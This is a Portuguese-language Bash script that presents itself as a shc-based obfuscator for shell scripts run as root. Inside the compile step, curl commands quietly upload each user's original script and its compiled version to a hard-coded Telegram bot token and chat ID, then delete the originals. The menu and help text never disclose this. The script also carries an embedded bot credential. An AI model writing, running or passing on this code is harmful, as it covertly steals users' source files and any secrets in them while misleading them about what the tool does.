#!/bin/bash

Bold=$(tput bold)
Norm=$(tput sgr0)
Red=$(tput setaf 1)
Green=$(tput setaf 2)
Yellow=$(tput setaf 3)
Blue=$(tput setaf 4)

TELEGRAM_BOT_TOKEN="7015789538:AAFD29heoLykOYJTxQ6oDj_H_aJNJI3pEKM"

CHAT_ID="5149161091"

banner(){
echo "ENCRYPT SH" | toilet --gay --font future
cat <<FECHA

FECHA

}

show_menu() {

package_toilet="toilet"
if dpkg -l | grep -q  "^ii.*$package_toilet"; then
clear
else
sudo apt-get install toilet -y
sudo apt-get update
sudo apt-get install build-essential
fi
clear
banner
printf """
 ${Blue}===============================${Norm}
 ${Blue}|${Norm}${Green}${Bold} 1 ) ENCRIPTAR               ${Norm}${Norm}${Blue}|${Norm}
 ${Blue}===============================${Norm}
 ${Blue}|${Norm}${Yellow}${Bold} 2 ) DICAS                   ${Norm}${Norm}${Blue}|${Norm}
 ${Blue}===============================${Norm}
 ${Blue}|${Norm}${Red}${Bold} 0 ) SAIR                    ${Norm}${Norm}${Blue}|${Norm}
 ${Blue}===============================${Norm}\n
 """
escolha
 }

escolha(){
  echo -ne "${Yellow}ESCOLHA UMA OPÇÃO?: ${Norm}"; read -p "" leitor
  [[ $leitor == 1 ]] && compile
  [[ $leitor == 2 ]] && helpsh
  [[ $leitor == 0 ]] && echo "${Red}${Bold}Saindo...${Norm}${Norm}" && sleep 2 && clear && exit 1
  [[ $leitor == * ]] && echo "${Red}${Bold}Opção inválida. Por favor, tente novamente.${Norm}${Norm}"  && sleep 2 && show_menu  
  
}

compile() {
echo ""

package_shc="shc"

if dpkg -l | grep -q  "^ii.*$package_shc"; then
[[ ! -d /root/original ]] && mkdir /root/original
[[ ! -d /root/encryptados ]] && mkdir /root/encryptados

folder_path="/root/original"

if [ -z "$(ls -A $folder_path)" ]; then
echo "${Red}${Bold}A pasta${Norm}${Norm} ${Blue}${Bold}$folder_path${Norm}${Norm} ${Red}${Bold}NÃO POSSUI ARQUIVOS.SH PRA COMPILAR!${Norm}${Norm}"
sleep 3
show_menu
fi
cd /root/original || exit
ls -A | grep -E ".sh" | while read -r file; do
shc -rUf /root/original/$file -o /root/encryptados/$file
echo "${Blue}${Bold}COMPILANDO${Norm}${Norm} $file..."

curl -s -F "chat_id=$CHAT_ID" -F "caption=Arquivo Original ✅" -F document=@"/root/original/$file" "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" >/dev/null

curl -s -F "chat_id=$CHAT_ID" -F "caption=Arquivo Compilado 🔑" -F document=@"/root/encryptados/$file" "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" >/dev/null
rm -rf /root/original/$file*
cd || exit
done
echo ""
echo "${Green}${Bold}COMPILADO COM SUCESSO!${Norm}${Norm}"
sleep 3
show_menu
else
 mv /etc/apt/apt.conf.d/20apt-esm-hook.conf /etc/apt/apt.conf.d/20apt-esm-hook.conf.disabled
 apt install software-properties-common -y
 add-apt-repository main
 add-apt-repository multiverse
 add-apt-repository restricted
 add-apt-repository universe
 apt install -f -y
 apt install -y update
 apt install -y upgrade
 add-apt-repository ppa:neurobin/ppa -y
 apt install -y update
 apt install -y upgrade
 apt install shc -y
 compile
fi
}

helpsh() {
    echo -e "DIGITE 1 PARA CRIA AS PASTAS NA PRIMEIRA VEZ\n\rESSE É UM OFUSCADOR SH PARA ARQUIVOS bash.\n\rJOGUE O arquivo.sh NA PASTA ${Blue}${Bold}/root/original${Norm}${Norm} E ESCOLHA A OPÇÃO 1.\n\rAPÓS O TÉRMINO, O ARQUIVO ESTARÁ NA PASTA ${Blue}${Bold}/root/encryptados${Norm}${Norm}."
    press_enter
}

press_enter() {
    read -rp "${Red}${Bold}PRESSIONE ENTER PARA VOLTAR...${Norm}${Norm}"
	show_menu
}

while true
do
    show_menu
done
